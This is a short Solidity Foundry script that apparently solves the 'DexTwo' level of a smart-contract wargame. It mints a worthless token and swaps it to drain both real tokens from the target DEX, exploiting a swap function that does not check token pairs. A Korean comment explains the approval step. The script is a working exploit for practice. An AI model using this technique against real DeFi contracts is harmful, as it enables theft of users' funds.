pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../src/DexTwo.sol";
import "../lib/openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";

contract AttackToken is ERC20 {
    constructor(uint256 initialSupply) ERC20("AttackToken", "ATT") {
        _mint(msg.sender, initialSupply);
    }
}

contract DexTwoScript is Script {
    function run() external {
        vm.startBroadcast();

        AttackToken attackToken = new AttackToken(1000);

        DexTwo dex = DexTwo(payable(0x38196f84121aa7cA6601F303b79e6cE0031A4CDB));

        attackToken.transfer(address(dex), 100);
        attackToken.approve(address(dex), 300); // swap() 내부의 transferFrom() 호출하기 위해 권한 부여

        dex.swap(address(attackToken), dex.token1(), 100);
        dex.swap(address(attackToken), dex.token2(), 200);

        vm.stopBroadcast();
    }
}
